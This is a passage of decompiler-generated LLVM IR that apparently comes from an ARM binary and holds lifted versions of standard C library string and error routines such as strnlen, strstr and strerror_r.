  store i32 %v5_11930, i32* @r1, align 4
  %v1_11934 = add i32 %v0_11934, -1
  store i32 %v1_11934, i32* %r2.global-to-local, align 4
  %v7_11934 = icmp eq i32 %v0_11934, 1
  store i1 %v7_11934, i1* %cpsr_z.global-to-local, align 1
  %v3_11938 = add i32 %v2_11938, 1
  %v4_11938 = inttoptr i32 %v3_11938 to i8*
  store i8 %v2_11930, i8* %v4_11938, align 1
  %v5_11938 = load i32, i32* @ip, align 4
  %v6_11938 = add i32 %v5_11938, 1
  store i32 %v6_11938, i32* @ip, align 4
  %v0_1193c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1193c, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_11940 = load i32, i32* %r3.global-to-local, align 4
  %v2_11940 = icmp eq i32 %v0_11940, 0
  store i1 %v2_11940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11940, label %dec_label_pc_11948, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_11934.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_11948:                               ; preds = %dec_label_pc_11914, %bb13, %dec_label_pc_11948
  %v2_11950 = phi i32 [ %v6_11950, %dec_label_pc_11948 ], [ %v1_11914, %dec_label_pc_11914 ], [ %v6_11938, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1194c = load i32, i32* %r2.global-to-local, align 4
  %v1_1194c = add i32 %v0_1194c, -1
  store i32 %v1_1194c, i32* %r2.global-to-local, align 4
  %v7_1194c = icmp eq i32 %v0_1194c, 1
  store i1 %v7_1194c, i1* %cpsr_z.global-to-local, align 1
  %v3_11950 = add i32 %v2_11950, 1
  %v4_11950 = inttoptr i32 %v3_11950 to i8*
  store i8 0, i8* %v4_11950, align 1
  %v5_11950 = load i32, i32* @ip, align 4
  %v6_11950 = add i32 %v5_11950, 1
  store i32 %v6_11950, i32* @ip, align 4
  %v0_11954 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11954, label %dec_label_pc_11958, label %dec_label_pc_11948

dec_label_pc_11958:                               ; preds = %dec_label_pc_11948
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_11950, { 1, 0 }
  uselistorder i32 %v0_1194c, { 1, 0 }
  uselistorder i32 %v6_11938, { 0, 2, 1 }
  uselistorder i32 %v1_11928, { 2, 1, 0 }
  uselistorder i32 %v2_11918, { 2, 1, 0 }
  uselistorder i32 %v1_11908, { 1, 0 }
  uselistorder i32 %v0_11904, { 1, 0 }
  uselistorder i32 %v6_118f8, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 3, 5, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_11948, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1195c = load i32, i32* @r1, align 4
  %v2_1195c = icmp eq i32 %v0_1195c, 0
  br i1 %v2_1195c, label %bb, label %dec_label_pc_1198c

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_11974:                               ; preds = %dec_label_pc_1199c
  %v3_11974 = icmp uge i32 %v5_11a28, %v1_11974
  %v9_11974 = icmp eq i32 %v5_11a28, %v1_11974
  %v2_11978 = xor i1 %v3_11974, true
  %v3_11978 = or i1 %v9_11974, %v2_11978
  br i1 %v3_11978, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_11974
  %v6_11978 = sub i32 %v5_11a28, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_11974, %bb19
  %v5_1197c = phi i32 [ %v1_11974, %dec_label_pc_11974 ], [ %v6_11978, %bb19 ]
  %v2_1197c = xor i1 %v9_11974, true
  %v3_1197c = and i1 %v3_11974, %v2_1197c
  br i1 %v3_1197c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_1197c = sub i32 %v5_1197c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_11980 = phi i32 [ %v5_1197c, %bb20 ], [ %v6_1197c, %bb21 ]
  ret i32 %v8_11980

dec_label_pc_11984:                               ; preds = %dec_label_pc_119d0
  br label %dec_label_pc_11a24

dec_label_pc_1198c:                               ; preds = %entry
  %v2_1198c = add i32 %tmp, %v0_1195c
  %v3_1198c = icmp ult i32 %v2_1198c, %tmp
  br i1 %v3_1198c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_1198c
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_1198c, %bb23
  %v5_11a28 = phi i32 [ %v2_1198c, %dec_label_pc_1198c ], [ -1, %bb23 ]
  %v1_119ac2 = urem i32 %tmp, 4
  %v2_119ac3 = icmp eq i32 %v1_119ac2, 0
  br i1 %v2_119ac3, label %dec_label_pc_119b4, label %dec_label_pc_1199c

dec_label_pc_1199c:                               ; preds = %bb24, %dec_label_pc_119a8
  %v1_11974 = phi i32 [ %v1_119a8, %dec_label_pc_119a8 ], [ %tmp, %bb24 ]
  %v1_1199c = inttoptr i32 %v1_11974 to i8*
  %v2_1199c = load i8, i8* %v1_1199c, align 1
  %v2_119a0 = icmp eq i8 %v2_1199c, 0
  br i1 %v2_119a0, label %dec_label_pc_11974, label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %dec_label_pc_1199c
  %v1_119a8 = add i32 %v1_11974, 1
  %v1_119ac = urem i32 %v1_119a8, 4
  %v2_119ac = icmp eq i32 %v1_119ac, 0
  br i1 %v2_119ac, label %dec_label_pc_119b4, label %dec_label_pc_1199c

dec_label_pc_119b4:                               ; preds = %dec_label_pc_119a8, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_119a8, %dec_label_pc_119a8 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_11a1432 = icmp ult i32 %storemerge.lcssa, %v5_11a28
  br i1 %v3_11a1432, label %dec_label_pc_119bc, label %dec_label_pc_11a24

dec_label_pc_119bc:                               ; preds = %dec_label_pc_11a10, %dec_label_pc_119b4
  %v0_1198439 = phi i32 [ %v4_119bc, %dec_label_pc_11a10 ], [ %storemerge.lcssa, %dec_label_pc_119b4 ]
  %v1_119bc = inttoptr i32 %v0_1198439 to i32*
  %v2_119bc = load i32, i32* %v1_119bc, align 4
  %v4_119bc = add i32 %v0_1198439, 4
  store i32 %v4_119bc, i32* @lr, align 4
  %v2_119c0 = add i32 %v2_119bc, -16843009
  %v2_119c4 = and i32 %v2_119c0, -2139062144
  %v2_119c8 = icmp eq i32 %v2_119c4, 0
  br i1 %v2_119c8, label %dec_label_pc_11a10, label %dec_label_pc_119d0

dec_label_pc_119d0:                               ; preds = %dec_label_pc_119bc
  %v2_119d0 = inttoptr i32 %v0_1198439 to i8*
  %v3_119d0 = load i8, i8* %v2_119d0, align 1
  %v2_119d8 = icmp eq i8 %v3_119d0, 0
  %v1_119dc = add i32 %v0_1198439, 1
  br i1 %v2_119d8, label %dec_label_pc_11984, label %dec_label_pc_119e4

dec_label_pc_119e4:                               ; preds = %dec_label_pc_119d0
  %v2_119e4 = inttoptr i32 %v1_119dc to i8*
  %v3_119e4 = load i8, i8* %v2_119e4, align 1
  %v2_119e8 = icmp eq i8 %v3_119e4, 0
  br i1 %v2_119e8, label %dec_label_pc_11a24, label %dec_label_pc_119f0

dec_label_pc_119f0:                               ; preds = %dec_label_pc_119e4
  %v1_119f0 = add i32 %v0_1198439, 2
  %v2_119f0 = inttoptr i32 %v1_119f0 to i8*
  %v3_119f0 = load i8, i8* %v2_119f0, align 1
  %v2_119f4 = icmp eq i8 %v3_119f0, 0
  br i1 %v2_119f4, label %dec_label_pc_11a24, label %dec_label_pc_11a00

dec_label_pc_11a00:                               ; preds = %dec_label_pc_119f0
  %v1_11a00 = add i32 %v0_1198439, 3
  %v2_11a00 = inttoptr i32 %v1_11a00 to i8*
  %v3_11a00 = load i8, i8* %v2_11a00, align 1
  %v2_11a04 = icmp eq i8 %v3_11a00, 0
  br i1 %v2_11a04, label %dec_label_pc_11a24, label %dec_label_pc_11a10

dec_label_pc_11a10:                               ; preds = %dec_label_pc_11a00, %dec_label_pc_119bc
  %v3_11a14 = icmp ult i32 %v4_119bc, %v5_11a28
  br i1 %v3_11a14, label %dec_label_pc_119bc, label %dec_label_pc_11a24

dec_label_pc_11a24:                               ; preds = %dec_label_pc_11a10, %dec_label_pc_119b4, %dec_label_pc_119e4, %dec_label_pc_119f0, %dec_label_pc_11a00, %dec_label_pc_11984
  %v1_11a24 = phi i32 [ %v0_1198439, %dec_label_pc_11984 ], [ %storemerge.lcssa, %dec_label_pc_119b4 ], [ %v1_119dc, %dec_label_pc_119e4 ], [ %v1_119f0, %dec_label_pc_119f0 ], [ %v1_11a00, %dec_label_pc_11a00 ], [ %v5_11a28, %dec_label_pc_11a10 ]
  %v3_11a24 = icmp uge i32 %v5_11a28, %v1_11a24
  %v9_11a24 = icmp eq i32 %v5_11a28, %v1_11a24
  %v2_11a28 = xor i1 %v3_11a24, true
  %v3_11a28 = or i1 %v9_11a24, %v2_11a28
  br i1 %v3_11a28, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_11a24
  %v6_11a28 = sub i32 %v5_11a28, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_11a24, %bb25
  %v5_11a2c = phi i32 [ %v1_11a24, %dec_label_pc_11a24 ], [ %v6_11a28, %bb25 ]
  %v2_11a2c = xor i1 %v9_11a24, true
  %v3_11a2c = and i1 %v3_11a24, %v2_11a2c
  br i1 %v3_11a2c, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_11a2c = sub i32 %v5_11a2c, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_11a30 = phi i32 [ %v5_11a2c, %bb26 ], [ %v6_11a2c, %bb27 ]
  ret i32 %v8_11a30

; uselistorder directives
  uselistorder i1 %v3_11a24, { 1, 0 }
  uselistorder i32 %v4_119bc, { 1, 2, 0 }
  uselistorder i32 %v0_1198439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_119a8, { 1, 0, 2 }
  uselistorder i32 %v1_11974, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_11a28, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_11974, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_11a24, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_1199c, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %v6_11a3c = load i32, i32* @r5, align 4
  %v9_11a3c = load i32, i32* @r6, align 4
  %v3_11a40 = load i8, i8* %arg2, align 1
  %v2_11a44 = icmp eq i8 %v3_11a40, 0
  br i1 %v2_11a44, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_11a4c = add i32 %arg1, -1
  br label %dec_label_pc_11a50

dec_label_pc_11a50:                               ; preds = %dec_label_pc_11a5c, %bb50
  %v0_11a50 = phi i32 [ %v1_11a50, %dec_label_pc_11a5c ], [ %v1_11a4c, %bb50 ]
  %v1_11a50 = add i32 %v0_11a50, 1
  %v2_11a50 = inttoptr i32 %v1_11a50 to i8*
  %v3_11a50 = load i8, i8* %v2_11a50, align 1
  %v2_11a54 = icmp eq i8 %v3_11a50, 0
  br i1 %v2_11a54, label %dec_label_pc_11b2c, label %dec_label_pc_11a5c

dec_label_pc_11a5c:                               ; preds = %dec_label_pc_11a50
  %v9_11a5c = icmp eq i8 %v3_11a50, %v3_11a40
  br i1 %v9_11a5c, label %dec_label_pc_11a64, label %dec_label_pc_11a50

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a5c
  %v2_11a64 = add i32 %tmp, 1
  %v3_11a64 = inttoptr i32 %v2_11a64 to i8*
  %v4_11a64 = load i8, i8* %v3_11a64, align 1
  %v2_11a68 = icmp eq i8 %v4_11a64, 0
  br i1 %v2_11a68, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_11a64
  store i32 %v6_11a3c, i32* @r5, align 4
  store i32 %v9_11a3c, i32* @r6, align 4
  ret i32 %v1_11a50

bb52:                                             ; preds = %dec_label_pc_11a64
  %v1_11a74 = add i32 %v0_11a50, 2
  %v1_11ac8 = add i32 %tmp, 2
  %v2_11ac8 = inttoptr i32 %v1_11ac8 to i8*
  br label %dec_label_pc_11ac0

dec_label_pc_11a84:                               ; preds = %dec_label_pc_11b20
  %v3_11a84 = load i8, i8* %v3_11ab8.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_11ab0.preheader

dec_label_pc_11ab0.preheader:                     ; preds = %dec_label_pc_11a84, %dec_label_pc_11ac0
  %v0_11ab04.in = phi i8 [ %v3_11a84, %dec_label_pc_11a84 ], [ %v3_11ab8.pn, %dec_label_pc_11ac0 ]
  %v9_11ab013 = icmp eq i8 %v0_11ab04.in, %v3_11a40
  br i1 %v9_11ab013, label %dec_label_pc_11ab8, label %dec_label_pc_11a90

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11ab0.preheader, %dec_label_pc_11aac
  %v0_11a98 = phi i32 [ %v1_11aac, %dec_label_pc_11aac ], [ %storemerge43, %dec_label_pc_11ab0.preheader ]
  %v0_11a90.in = phi i8 [ %v3_11aac, %dec_label_pc_11aac ], [ %v0_11ab04.in, %dec_label_pc_11ab0.preheader ]
  %v2_11a90 = icmp eq i8 %v0_11a90.in, 0
  br i1 %v2_11a90, label %dec_label_pc_11b2c, label %dec_label_pc_11a98

dec_label_pc_11a98:                               ; preds = %dec_label_pc_11a90
  %v1_11a98 = add i32 %v0_11a98, 1
  %v2_11a98 = inttoptr i32 %v1_11a98 to i8*
  %v3_11a98 = load i8, i8* %v2_11a98, align 1
  store i32 %v1_11a98, i32* @ip, align 4
  %v9_11a9c = icmp eq i8 %v3_11a98, %v3_11a40
  br i1 %v9_11a9c, label %dec_label_pc_11ab8, label %dec_label_pc_11aa4

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11a98
  %v2_11aa4 = icmp eq i8 %v3_11a98, 0
  br i1 %v2_11aa4, label %dec_label_pc_11b2c, label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11aa4
  %v1_11aac = add i32 %v0_11a98, 2
  %v2_11aac = inttoptr i32 %v1_11aac to i8*
  %v3_11aac = load i8, i8* %v2_11aac, align 1
  store i32 %v1_11aac, i32* @ip, align 4
  %v9_11ab0 = icmp eq i8 %v3_11aac, %v3_11a40
  br i1 %v9_11ab0, label %dec_label_pc_11ab8, label %dec_label_pc_11a90

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_11a98, %dec_label_pc_11aac, %dec_label_pc_11ab0.preheader
  %v0_11ab8 = phi i32 [ %storemerge43, %dec_label_pc_11ab0.preheader ], [ %v1_11a98, %dec_label_pc_11a98 ], [ %v1_11aac, %dec_label_pc_11aac ]
  %v1_11ab8 = add i32 %v0_11ab8, 1
  br label %dec_label_pc_11ac0

dec_label_pc_11ac0:                               ; preds = %bb52, %dec_label_pc_11ab8
  %storemerge43 = phi i32 [ %v1_11ab8, %dec_label_pc_11ab8 ], [ %v1_11a74, %bb52 ]
  %v3_11ab8.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_11ab8.pn = load i8, i8* %v3_11ab8.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_11ab8.pn, %v4_11a64
  br i1 %storemerge, label %dec_label_pc_11ac4, label %dec_label_pc_11ab0.preheader

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11ac0
  %v1_11ac4 = add i32 %storemerge43, 1
  %v2_11ac4 = inttoptr i32 %v1_11ac4 to i8*
  %v3_11ac4 = load i8, i8* %v2_11ac4, align 1
  %v4_11ac4 = zext i8 %v3_11ac4 to i32
  %v3_11ac8 = load i8, i8* %v2_11ac8, align 1
  %v4_11ac8 = zext i8 %v3_11ac8 to i32
  %v1_11acc = add i32 %storemerge43, -1
  %v9_11ad0 = icmp eq i8 %v3_11ac4, %v3_11ac8
  store i32 %v1_11ac8, i32* @lr, align 4
  store i32 %v1_11ac4, i32* @ip, align 4
  br i1 %v9_11ad0, label %dec_label_pc_11ae0, label %dec_label_pc_11b20

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11ac4, %dec_label_pc_11adc
  %v0_11af8 = phi i32 [ %v1_11b00, %dec_label_pc_11adc ], [ %v1_11ac8, %dec_label_pc_11ac4 ]
  %v0_11af0 = phi i32 [ %v1_11afc, %dec_label_pc_11adc ], [ %v1_11ac4, %dec_label_pc_11ac4 ]
  %v0_11ae0 = phi i32 [ %v4_11b10, %dec_label_pc_11adc ], [ %v4_11ac4, %dec_label_pc_11ac4 ]
  %v2_11ae0 = icmp eq i32 %v0_11ae0, 0
  br i1 %v2_11ae0, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_11ae0
  store i32 %v6_11a3c, i32* @r5, align 4
  store i32 %v9_11a3c, i32* @r6, align 4
  ret i32 %v1_11acc

bb54:                                             ; preds = %dec_label_pc_11ae0
  %v1_11ae8 = add i32 %v0_11af0, 1
  %v2_11ae8 = inttoptr i32 %v1_11ae8 to i8*
  %v3_11ae8 = load i8, i8* %v2_11ae8, align 1
  %v1_11aec = add i32 %v0_11af8, 1
  %v2_11aec = inttoptr i32 %v1_11aec to i8*
  %v3_11aec = load i8, i8* %v2_11aec, align 1
  %v4_11aec = zext i8 %v3_11aec to i32
  store i32 %v1_11ae8, i32* @r1, align 4
  %v9_11af4 = icmp eq i8 %v3_11ae8, %v3_11aec
  %v1_11afc = add i32 %v0_11af0, 2
  store i32 %v1_11afc, i32* @ip, align 4
  %v1_11b00 = add i32 %v0_11af8, 2
  store i32 %v1_11b00, i32* @lr, align 4
  br i1 %v9_11af4, label %dec_label_pc_11b08, label %dec_label_pc_11b20

dec_label_pc_11b08:                               ; preds = %bb54
  %v2_11b08 = icmp eq i8 %v3_11ae8, 0
  br i1 %v2_11b08, label %bb55, label %dec_label_pc_11adc

bb55:                                             ; preds = %dec_label_pc_11b08
  store i32 %v6_11a3c, i32* @r5, align 4
  store i32 %v9_11a3c, i32* @r6, align 4
  ret i32 %v1_11acc

dec_label_pc_11adc:                               ; preds = %dec_label_pc_11b08
  %v2_11b10 = inttoptr i32 %v1_11b00 to i8*
  %v3_11b10 = load i8, i8* %v2_11b10, align 1
  %v4_11b10 = zext i8 %v3_11b10 to i32
  %v2_11b14 = inttoptr i32 %v1_11afc to i8*
  %v3_11b14 = load i8, i8* %v2_11b14, align 1
  %v9_11b18 = icmp eq i8 %v3_11b14, %v3_11b10
  br i1 %v9_11b18, label %dec_label_pc_11ae0, label %dec_label_pc_11b20

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11adc, %bb54, %dec_label_pc_11ac4
  %v0_11b20 = phi i32 [ %v4_11ac8, %dec_label_pc_11ac4 ], [ %v4_11b10, %dec_label_pc_11adc ], [ %v4_11aec, %bb54 ]
  %v2_11b20 = icmp eq i32 %v0_11b20, 0
  br i1 %v2_11b20, label %dec_label_pc_11b28, label %dec_label_pc_11a84

dec_label_pc_11b28:                               ; preds = %dec_label_pc_11b20
  store i32 %v6_11a3c, i32* @r5, align 4
  store i32 %v9_11a3c, i32* @r6, align 4
  ret i32 %v1_11acc

dec_label_pc_11b2c:                               ; preds = %dec_label_pc_11a50, %dec_label_pc_11aa4, %dec_label_pc_11a90
  store i32 %v6_11a3c, i32* @r5, align 4
  store i32 %v9_11a3c, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11b00, { 0, 2, 1 }
  uselistorder i32 %v1_11afc, { 1, 2, 0 }
  uselistorder i32 %v1_11acc, { 2, 1, 0 }
  uselistorder i8 %v3_11ab8.pn, { 1, 0 }
  uselistorder i8* %v3_11ab8.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_11aac, { 1, 0 }
  uselistorder i32 %v1_11aac, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11a50, { 0, 2, 1 }
  uselistorder i8 %v3_11a40, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_11a3c, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_11a3c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_11b2c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11ae0, { 1, 0 }
  uselistorder label %dec_label_pc_11ac0, { 1, 0 }
  uselistorder label %dec_label_pc_11ab8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11a90, { 1, 0 }
  uselistorder label %dec_label_pc_11ab0.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11b3c = call i32 @__xpg_strerror_r()
  %v0_11b40 = load i32, i32* @r4, align 4
  ret i32 %v0_11b40
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_11b48 = load i32, i32* @r4, align 4
  %v0_11b4c = load i32, i32* @r0, align 4
  %v0_11b58 = load i32, i32* @r1, align 4
  store i32 %v0_11b58, i32* @r8, align 4
  %v0_11b5c = load i32, i32* @r2, align 4
  store i32 %v0_11b5c, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_11b4c, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_11b94

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_193ac.413 to i32), i32* @r5, align 4
  %v2_11b7c3446 = icmp eq i32 %v0_11b4c, 0
  br i1 %v2_11b7c3446, label %bb26, label %dec_label_pc_11b70.lr.ph

dec_label_pc_11b70:                               ; preds = %dec_label_pc_11b70.lr.ph, %bb
  %v2_11b8841 = phi i1 [ %v2_11b883849, %dec_label_pc_11b70.lr.ph ], [ %v2_11b88, %bb ]
  %v1_11b8c40 = phi i32 [ %v0_11b7c.pr48, %dec_label_pc_11b70.lr.ph ], [ %v2_11b78, %bb ]
  %v0_11b7439 = phi i32 [ %v0_11b80547, %dec_label_pc_11b70.lr.ph ], [ %v1_11b74, %bb ]
  %v1_11b74 = add i32 %v0_11b7439, 1
  store i32 %v1_11b74, i32* @r5, align 4
  br i1 %v2_11b8841, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_11b70
  %v2_11b78 = add i32 %v1_11b8c40, -1
  %v2_11b7c = icmp eq i32 %v2_11b78, 0
  %v1_11b80 = inttoptr i32 %v1_11b74 to i8*
  %v2_11b80 = load i8, i8* %v1_11b80, align 1
  %v2_11b88 = icmp eq i8 %v2_11b80, 0
  br i1 %v2_11b7c, label %dec_label_pc_11b88, label %dec_label_pc_11b70

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_11b70
  %v1_11b8035 = inttoptr i32 %v1_11b74 to i8*
  %v2_11b8036 = load i8, i8* %v1_11b8035, align 1
  %v2_11b8838 = icmp eq i8 %v2_11b8036, 0
  br label %dec_label_pc_11b70.lr.ph

dec_label_pc_11b70.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_11b883849 = phi i1 [ %v2_11b8838, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_11b7c.pr48 = phi i32 [ %v1_11b8c40, %thread-pre-split.loopexit ], [ %v0_11b4c, %thread-pre-split.preheader ]
  %v0_11b80547 = phi i32 [ %v1_11b74, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_193ac.413 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_11b70

dec_label_pc_11b88:                               ; preds = %bb
  br i1 %v2_11b88, label %dec_label_pc_11b94, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_11b88
  %v0_11b74.lcssa55 = phi i32 [ %v1_11b74, %dec_label_pc_11b88 ], [ ptrtoint ([8 x i8]* @global_var_193ac.413 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11bc8

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11b88, %entry
  %v3_11b98 = ashr i32 %v0_11b4c, 31
  %v5_11bac = bitcast i32* %stack_var_-25 to i8*
  %v6_11bac = call i32 @_uintmaxtostr(i8* %v5_11bac, i32 %v0_11b4c, i32 %v3_11b98, i32 -10, i32 0)
  %v1_11bb0 = add i32 %v6_11bac, -14
  store i32 %v1_11bb0, i32* @r5, align 4
  store i32 %v1_11bb0, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1939c.415 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_11bc0 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_11bc8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11bc8

dec_label_pc_11bc8:                               ; preds = %bb26, %dec_label_pc_11b94
  %v0_11bc8 = phi i32 [ %v0_11b74.lcssa55, %bb26 ], [ %v0_11bc8.pre, %dec_label_pc_11b94 ]
  %v1_11bc8 = inttoptr i32 %v0_11bc8 to i8*
  %v3_11bcc = call i32 @strlen(i8* %v1_11bc8)
  %v0_11bd0 = load i32, i32* @r8, align 4
  %v2_11bd0 = icmp eq i32 %v0_11bd0, 0
  %v1_11bd4 = add i32 %v3_11bcc, 1
  store i32 %v1_11bd4, i32* @r4, align 4
  br i1 %v2_11bd0, label %bb27, label %dec_label_pc_11bc8._crit_edge

dec_label_pc_11bc8._crit_edge:                    ; preds = %dec_label_pc_11bc8
  %v1_11bdc.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_11bc8
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_11bc8._crit_edge, %bb27
  %v4_11be0 = phi i32 [ %v1_11bdc.pre, %dec_label_pc_11bc8._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_11bd4, %v4_11be0
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_11be0, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_11bf014 = phi i32 [ %v4_11be0, %bb29 ], [ %v1_11bd4, %bb28 ]
  %v2_11be8 = icmp eq i32 %v0_11bf014, 0
  br i1 %v2_11be8, label %dec_label_pc_11c0c, label %dec_label_pc_11bf0

dec_label_pc_11bf0:                               ; preds = %.thread16
  store i32 %v0_11bf014, i32* @r2, align 4
  %v0_11bf4 = load i32, i32* @r5, align 4
  store i32 %v0_11bf4, i32* @r1, align 4
  store i32 %v0_11bd0, i32* @r0, align 4
  %v0_11bfc = call i32 @memcpy()
  %v0_11c00 = load i32, i32* @r8, align 4
  %v1_11c00 = load i32, i32* @r4, align 4
  %v2_11c00 = add i32 %v1_11c00, %v0_11c00
  %v3_11c08 = add i32 %v2_11c00, -1
  %v4_11c08 = inttoptr i32 %v3_11c08 to i8*
  store i8 0, i8* %v4_11c08, align 1
  br label %dec_label_pc_11c0c

dec_label_pc_11c0c:                               ; preds = %.thread16, %dec_label_pc_11bf0
  %v0_11c0c = load i32, i32* %r7.global-to-local, align 4
  %v2_11c0c = icmp eq i32 %v0_11c0c, 0
  br i1 %v2_11c0c, label %dec_label_pc_11c1c, label %dec_label_pc_11c14

dec_label_pc_11c14:                               ; preds = %dec_label_pc_11c0c
  %v0_11c14 = call i32 @__errno_location()
  %v0_11c18 = load i32, i32* %r7.global-to-local, align 4
  %v2_11c18 = inttoptr i32 %v0_11c14 to i32*
  store i32 %v0_11c18, i32* %v2_11c18, align 4
  %v0_11c1c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11c1c

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11c0c, %dec_label_pc_11c14
  %v0_11c1c = phi i32 [ 0, %dec_label_pc_11c0c ], [ %v0_11c1c.pre, %dec_label_pc_11c14 ]
  store i32 %v3_11b48, i32* @r4, align 4
  ret i32 %v0_11c1c

; uselistorder directives
  uselistorder i32 %v4_11be0, { 1, 2, 0 }
  uselistorder i32 %v1_11bd4, { 1, 0, 2 }
  uselistorder i32 %v1_11b74, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_11b4c, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_11c1c, { 1, 0 }
  uselistorder label %dec_label_pc_11c0c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_11bc8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
